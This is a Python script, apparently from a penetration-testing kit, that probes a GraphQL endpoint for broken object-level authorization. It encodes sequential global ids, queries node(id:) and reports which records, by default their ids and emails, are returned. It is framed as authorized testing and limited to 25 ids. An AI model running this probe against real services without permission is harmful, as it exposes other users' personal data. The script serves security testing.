#!/usr/bin/env python3
"""
graphql_node_sweep.py — demonstrate GraphQL node(id:) / *ById BOLA (small range, benign).

Relay-style GraphQL exposes objects via global ids that are usually base64("Type:intpk").
If the resolver doesn't check ownership, iterating the inner integer is a textbook BOLA
(guide §15). This helper encodes "Type:<n>" -> base64, queries node(id:), and reports which
ids returned data — over a SMALL range only (default 5), so it's proof-of-pattern, not a scrape.

Authorized testing only. Keep the range tiny. Pair with the full API/GraphQL/ kit.
"""
import argparse, base64, json, sys
try:
    import requests
except ImportError:
    sys.exit("pip install requests")


def gid(type_name, n):
    return base64.b64encode(f"{type_name}:{n}".encode()).decode()


def main():
    p = argparse.ArgumentParser(description="GraphQL node(id) BOLA prober (authorized testing only).")
    p.add_argument("--url", required=True, help="GraphQL endpoint, e.g. https://t/graphql")
    p.add_argument("--token", help="your account token (bearer)")
    p.add_argument("--type", default="User", help="GraphQL type name (e.g. User, Order)")
    p.add_argument("--fields", default="id email", help="fields to request (space-separated)")
    p.add_argument("--start", type=int, default=1)
    p.add_argument("--count", type=int, default=5, help="KEEP SMALL (default 5)")
    args = p.parse_args()

    if args.count > 25:
        sys.exit("Refusing count > 25 — prove the pattern small (guide §25.3).")

    headers = {"Content-Type": "application/json"}
    if args.token:
        headers["Authorization"] = f"Bearer {args.token}"

    print(f"== GraphQL node({args.type}) BOLA probe: ids {args.start}..{args.start+args.count-1} ==\n")
    hits = 0
    for n in range(args.start, args.start + args.count):
        g = gid(args.type, n)
        query = '{ node(id: "%s") { ... on %s { %s } } }' % (g, args.type, args.fields)
        try:
            r = requests.post(args.url, headers=headers, data=json.dumps({"query": query}), timeout=20)
            data = r.json()
        except Exception as e:
            print(f"{args.type}:{n}  ({g})  ERROR {e}"); continue
        node = (data.get("data") or {}).get("node")
        if node:
            hits += 1
            print(f"{args.type}:{n}  ({g})  -> {json.dumps(node)}")
        else:
            errs = data.get("errors")
            print(f"{args.type}:{n}  ({g})  -> null{' / '+errs[0].get('message','') if errs else ''}")

    print(f"\n-- {hits}/{args.count} node ids returned data.")
    if hits > 1:
        print("→ Multiple distinct ids resolve via node(id:) → BOLA: aliases/batching scale this")
        print("  (see API/GraphQL/ for batching, introspection, and write mutations).")
    print("Cite population from a list query total or the max id — do NOT scrape real users (guide §25.3).")


if __name__ == "__main__":
    main()
